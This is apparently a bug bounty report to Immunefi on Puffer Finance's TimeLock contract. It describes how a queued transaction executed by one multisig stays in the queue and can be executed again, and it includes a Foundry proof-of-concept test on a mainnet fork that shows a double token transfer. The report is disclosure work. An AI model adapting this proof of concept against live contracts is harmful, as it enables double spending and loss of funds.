# 28971 - \[SC - Low] Double spending or double execution of transact...

Submitted on Mar 3rd 2024 at 20:33:14 UTC by @codesentry for [Boost | Puffer Finance](https://immunefi.com/bounty/pufferfinance-boost/)

Report ID: #28971

Report type: Smart Contract

Report severity: Low

Target: <https://etherscan.io/address/0x3C28B7c7Ba1A1f55c9Ce66b263B33B204f2126eA#code>

Impacts:

* Protocol insolvency
* Permanent freezing of unclaimed yield
* Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

COMMUNITY\_MULTISIG wallet can execute the transaction queued by OPERATIONS\_MULTISIG . Transaction is not removed from queue when COMMUNITY\_MULTISIG execute it. In this case OPERATIONS\_MULTISIG can execute same transaction again. This is a sever bug and can cause double spending, double execution of transaction. Even OPERATIONS\_MULTISIG can execute tx without waiting for delay period to pass. All scenario explained in ## Impact Details section.

## Vulnerability Details

This bug is in `executeTransaction()` method of TimeLock contract. OPERATIONS\_MULTISIG queue a transaction and COMMUNITY\_MULTISIG execute it by calling below method

`executeTransaction(target, callData,operationId)`

Whenever COMMUNITY\_MULTISIG execute it, it does not remove it from queue. This tx exist in queue even it has been executed by COMMUNITY\_MULTISIG hence OPERATIONS\_MULTISIG can execute it again.

Steps

1. OPERATIONS\_MULTISIG calls `timelock.queueTransaction(target, callData, 1);`
2. Time delay passed but actually transaction executed by COMMUNITY\_MULTISIG. COMMUNITY\_MULTISIG calls timelock.executeTransaction(target, callData, 1);
3. OPERATIONS\_MULTISIG is able to call same tx again even thought it has already been executed by COMMUNITY\_MULTISIG.\
   OPERATIONS\_MULTISIG calls below method successfully. timelock.executeTransaction(target, callData, 1);

This result in calling timelock.executeTransaction(target, callData, 1) two times.

## Impact Details

Below are some scenario that explains the impact. There are can be multiple scenarios exists but I writing two examples below

Scenario1:

1. OPERATIONS\_MULTISIG queue a transaction to upgrade implementation contract of PufferDepositor to implV2. This upgrade is being done to fix a bug.
2. After tx was queued, community found that bug is sever hence upgrade the proxy contract immediately by calling timelock.executeTransaction(target, callData, 1) by COMMUNITY\_MULTISIG. Now proxy's implementation contract is implV2.
3. After few days community found that implV2 also has another sever bug hence it upgrade to implV3 by executing timelock.executeTransaction(target, callData, 2) immediately.
4. Previous queued transaction was not removed from queue. OPERATIONS\_MULTISIG calls timelock.executeTransaction(target, callData, 1) and upgrade proxy to old version which has some bug.\
   Implication of this scenario is that proxy is upgraded to old version by OPERATIONS\_MULTISIG without waiting for delay period.

Scenario 2: Timelock contract is owner of some treasury contract. Treasury contract has some ERC20 balance.

1. OPERATIONS\_MULTISIG queue a transaction to transfer 10 token to Alice for operationId =1 .
2. COMMUNITY\_MULTISIG execute this transaction and transfers 10 token to Alice. 3) OPERATIONS\_MULTISIG execute same tx and transfer 10 more token because tx is not removed from queue.\
   Net result is loss of asset or double spending of treasury asset.

Upgrade from implV3 to implV2 is done with no waiting or delay period. This can have serious implication for users as proxy upgraded to older version that too without wait.

Overall timelock contract has sever bug in executeTransaction(). Ideally this should remove the queued tx if already executed.

## References

Add any relevant links to documentation or code

## Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import {Ownable} from "openzeppelin/access/Ownable.sol";

interface ITimeLock {
    function executeTransaction(
        address target,
        bytes calldata callData,
        uint256 operationId
    ) external returns (bool success, bytes memory returnData);

    function queueTransaction(
        address target,
        bytes memory callData,
        uint256 operationId
    ) external returns (bytes32);

    function delay() external view returns (uint256);

    function COMMUNITY_MULTISIG() external view returns (address);

    function OPERATIONS_MULTISIG() external view returns (address);
}

contract Treasury is Ownable {
    constructor(address _initialOwner) Ownable(_initialOwner) {}

    function transferAsset(
        IERC20 _token,
        address _recipient,
        uint256 _amount
    ) external returns (bool) {
        return _token.transfer(_recipient, _amount);
    }
}

contract TimeLockBugPOC is Test {
    // This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1.
    bytes32 constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    ITimeLock public timelock;

    Treasury public treasury;

    address alice = makeAddr("alice");

    IERC20 CVX = IERC20(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B);

    address COMMUNITY_MULTISIG;
    address OPERATIONS_MULTISIG;

    function setUp() public virtual {
        vm.createSelectFork(vm.envString("NODE_URL"));
        timelock = ITimeLock(0x3C28B7c7Ba1A1f55c9Ce66b263B33B204f2126eA);

        treasury = new Treasury(address(timelock));

        deal(address(CVX), address(treasury), 200e18);

        COMMUNITY_MULTISIG = timelock.COMMUNITY_MULTISIG();
        OPERATIONS_MULTISIG = timelock.OPERATIONS_MULTISIG();

        vm.label(COMMUNITY_MULTISIG, "COMMUNITY_MULTISIG");
        vm.label(OPERATIONS_MULTISIG, "OPERATIONS_MULTISIG");
    }

    function test_timelockBug() public {
        // step1: OPERATIONS_MULTISIG queue transaction to transfer 10 cvx
        vm.startPrank(timelock.OPERATIONS_MULTISIG());
        uint256 amountToTransfer = 10e18;
        bytes memory callData = abi.encodeCall(
            treasury.transferAsset,
            (CVX, alice, amountToTransfer)
        );
        timelock.queueTransaction(address(treasury), callData, 1);

        uint256 lockedUntil = block.timestamp + timelock.delay();
        vm.warp(lockedUntil + 1);
        vm.stopPrank();

        // step2: Community multisig execute the queued transaction
        vm.startPrank(timelock.COMMUNITY_MULTISIG());
        timelock.executeTransaction(address(treasury), callData, 1);
        assertEq(CVX.balanceOf(alice), amountToTransfer);

        // step3: Operation multisig execute queued transaction once again and Alice received 10 cvx 2 times
        vm.startPrank(timelock.OPERATIONS_MULTISIG());
        timelock.executeTransaction(address(treasury), callData, 1);

        assertEq(CVX.balanceOf(alice), 2 * amountToTransfer);
        vm.stopPrank();
    }
}

```
